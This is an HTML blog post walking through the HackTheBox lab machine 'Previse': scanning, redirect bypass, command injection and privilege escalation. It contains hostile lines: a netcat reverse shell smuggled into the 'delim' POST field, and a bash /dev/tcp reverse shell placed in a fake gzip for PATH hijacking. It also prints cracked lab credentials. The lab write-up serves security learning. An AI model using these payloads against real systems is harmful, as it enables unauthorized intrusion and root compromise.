<!doctype html><html lang=en><head><title>Previse write-up (HackTheBox) Â· HOME</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdn.jsdelivr.net/; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Khaled Ngm"><meta name=description content="Previse write-up HackTheBox Link to heading 1. Port Scan Enumuration Link to heading 2. Exploitation Link to heading 3. Privilege Escalation Link to heading USER Link to heading ROOT Link to heading Port Scan (Nmap) Link to heading First We will scan target with nmap nmap -sV -sC 10.10.11.104 I found two open ports ssh and http Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 03:00 EDT Stats: 0:02:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 39."><meta name=keywords content="Red Team ,blog,pentester,penetration testesr,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="Previse write-up (HackTheBox)"><meta name=twitter:description content="Previse write-up HackTheBox Link to heading 1. Port Scan Enumuration Link to heading 2. Exploitation Link to heading 3. Privilege Escalation Link to heading USER Link to heading ROOT Link to heading Port Scan (Nmap) Link to heading First We will scan target with nmap nmap -sV -sC 10.10.11.104 I found two open ports ssh and http Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 03:00 EDT Stats: 0:02:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 39."><meta property="og:title" content="Previse write-up (HackTheBox)"><meta property="og:description" content="Previse write-up HackTheBox Link to heading 1. Port Scan Enumuration Link to heading 2. Exploitation Link to heading 3. Privilege Escalation Link to heading USER Link to heading ROOT Link to heading Port Scan (Nmap) Link to heading First We will scan target with nmap nmap -sV -sC 10.10.11.104 I found two open ports ssh and http Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 03:00 EDT Stats: 0:02:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 39."><meta property="og:type" content="article"><meta property="og:url" content="https://khaledngm11.github.io/posts/previse/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-07-04T00:00:00+00:00"><meta property="article:modified_time" content="2022-07-04T00:00:00+00:00"><link rel=canonical href=https://khaledngm11.github.io/posts/previse/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.c4d7e93a158eda5a65b3df343745d2092a0a1e2170feeec909b8a89443903c6a.css integrity="sha256-xNfpOhWO2lpls980N0XSCSoKHiFw/u7JCbiolEOQPGo=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.104.2"></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>HOME</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/about/>About</a></li><li class=navigation-item><a class=navigation-link href=/posts/>Writeups</a></li><li class=navigation-item><a class=navigation-link href=/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=https://khaledngm11.github.io/pt-br/></a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://khaledngm11.github.io/posts/previse/>Previse write-up (HackTheBox)</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2022-07-04T00:00:00Z>July 4, 2022</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
3-minute read</span></div></div></header><div><h1 id=previse-write-up-hackthebox>Previse write-up HackTheBox
<a class=heading-link href=#previse-write-up-hackthebox><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><p><img src=/blog/images/1.png alt=previse></p><h3 id=1-port-scan-enumuration>1. Port Scan Enumuration
<a class=heading-link href=#1-port-scan-enumuration><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><h3 id=2-exploitation>2. Exploitation
<a class=heading-link href=#2-exploitation><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><h3 id=3-privilege-escalation>3. Privilege Escalation
<a class=heading-link href=#3-privilege-escalation><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><ul><li><h3 id=user>USER
<a class=heading-link href=#user><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3></li><li><h3 id=root>ROOT
<a class=heading-link href=#root><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3></li></ul><h2 id=port-scan-nmap>Port Scan (Nmap)
<a class=heading-link href=#port-scan-nmap><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>First We will scan target with nmap <code>nmap -sV -sC 10.10.11.104</code></li><li>I found two open ports <code>ssh</code> and <code>http</code></li></ul><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 03:00 EDT
</span></span><span style=display:flex><span>Stats: 0:02:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
</span></span><span style=display:flex><span>Connect Scan Timing: About 39.79% done; ETC: 03:05 (0:03:08 remaining)
</span></span><span style=display:flex><span>Stats: 0:06:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
</span></span><span style=display:flex><span>Service scan Timing: About 50.00% done; ETC: 03:06 (0:00:07 remaining)
</span></span><span style=display:flex><span>Nmap scan report for previse.htb (10.10.11.104)
</span></span><span style=display:flex><span>Host is up (0.45s latency).
</span></span><span style=display:flex><span>Not shown: 997 closed ports
</span></span><span style=display:flex><span>PORT     STATE    SERVICE          VERSION
</span></span><span style=display:flex><span>22/tcp   open     ssh              OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
</span></span><span style=display:flex><span>|_  256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
</span></span><span style=display:flex><span>80/tcp   open     http             Apache httpd 2.4.29 ((Ubuntu))
</span></span><span style=display:flex><span>| http-cookie-flags: 
</span></span><span style=display:flex><span>|   /: 
</span></span><span style=display:flex><span>|     PHPSESSID: 
</span></span><span style=display:flex><span>|_      httponly flag not set
</span></span><span style=display:flex><span>| http-title: Previse Login
</span></span><span style=display:flex><span>|_Requested resource was login.php
</span></span><span style=display:flex><span>3269/tcp filtered globalcatLDAPssl
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap done: 1 IP address (1 host up) scanned in 515.82 seconds
</span></span></code></pre></div><h2 id=exploitation>Exploitation
<a class=heading-link href=#exploitation><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li><p>I found login Web page at http server.</p></li><li><p>let&rsquo;s try to fuzz directories with DirSearch .
<code>python3 dirsearch.py -u http://10.10.11.104/</code> and I have found an interesting directory called <code>nav.php</code></p><p><img src=/blog/images/2.png alt></p></li><li><p>I tried to create account or visit any another links but pages have been redirected to <code>login.php</code> with <code>302 Found</code></p></li><li><p>So I tried to edit response with <code>200 ok</code> and send it back to the server .</p></li></ul><p><img src=/blog/images/3.png alt></p><ul><li>And I got a registration form , Then I created a new account.</li><li>When I logged in I found visited <code>files</code> menu and found <code>SITEBACKUP.ZIP</code> file .</li><li>When I extracted The file I found interesting files such as <code>config.php</code> that contian db credentials and more interesting php file called <code>log.php</code> , let&rsquo;s check source code.</li><li>I found <code>exec</code> function that take delim via post request run python script without any validation .</li><li>I went to log file page MANAGEMENT MENU &#187; LOG DATA and opened burp broxy to see request.</li><li>So I listened on the server with <code>nc -nlvp 9999</code> and tried to inject <code>delim</code> with reverse shell <code>delim=comma;nc+-e+/bin/sh+[ip]+[port]</code> and finally I got a shell .</li><li>lets use <code>python -c "import pty;pty.spawn('/bin/sh')"</code> to get interactive shell .</li></ul><h2 id=privilege-escalation-user>Privilege escalation (User)
<a class=heading-link href=#privilege-escalation-user><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Now we are <code>www-data</code> we will try to escalat our privilages .</li><li>Let&rsquo;s connect to database with <code>username</code> and <code>password</code> located in <code>config.php</code> file , <code>mysql -u root -D previse -p</code> and then password <code>mySQL_p@ssw0rd!:)</code>.</li><li>Then I found a Table Called <code>account</code> , let&rsquo;s show table content with <code>select * from accounts;</code></li><li>And I found a user called <code>m4lwhere</code> that already exist on OS , and I tried to Identify hash type with hashID .
*When I got the mode of hash I used <code>hashcat</code> to decrypt it with <code>hashcat -a 3 -m 500 hash.txt /wordlist_path</code> that retrieve <code>ilovecody112235!</code> password .</li><li>Let&rsquo;s connect with <code>ssh</code> to get user flag <code>ssh m4lwhere@10.10.11.104</code></li></ul><h2 id=privilege-escalation-root>Privilege escalation (Root)
<a class=heading-link href=#privilege-escalation-root><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>First we will apply <code>sudo -l</code> command to see what commands this user can run with high privileges .</li><li>user can run <code>/opt/scripts/access_backup.sh</code> as a root .</li><li>When I checked content I found <code>gzip</code> command run without full path.</li><li>let&rsquo;s create file called <code>gzip</code> with bash reverse shell content <code>bash -i >& /dev/tcp/ip/port 0>&1</code> at <code>/tmp</code> directory and add this file to PATH <code>export PATH="/tmp:$PATH"</code> and give it a permission <code>chmod +x /tmp/gzip</code>.</li><li>Now we can listen on port and run command <code>sudo /opt/scripts/access_backup.sh</code> .</li><li>Finally we Got a root shell . :).</li></ul><h1 id=thanks>Thanks
<a class=heading-link href=#thanks><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1></div><footer></footer></article></section></div><footer class=footer><section class=container>Â©
2022
Khaled Ngm
Â·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script></body></html>